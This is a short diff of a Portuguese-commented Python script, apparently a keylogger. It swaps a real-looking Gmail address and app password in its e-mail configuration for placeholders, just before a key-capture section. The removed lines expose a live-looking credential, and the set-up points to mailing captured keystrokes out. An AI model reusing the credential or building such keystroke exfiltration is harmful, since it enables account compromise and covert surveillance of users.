@@ -19,9 +19,9 @@ email_sent = False  # Flag para controlar envio
 # ===============================
 # CONFIGURAÇÕES DE E-MAIL (para simulação)
 # ===============================
-EMAIL_ADDRESS = "zntcba@gmail.com"
-EMAIL_PASSWORD = "iqyu keda hcsn kfed"  # Senha de app (Gmail)
-DESTINO_EMAIL = "zntcba@gmail.com"
+EMAIL_ADDRESS = "email@gmail.com"
+EMAIL_PASSWORD = "senha"  # Senha de app (Gmail)
+DESTINO_EMAIL = "email@gmail.com"
 
 # ===============================
 # FUNÇÃO PARA CAPTURAR TECLAS
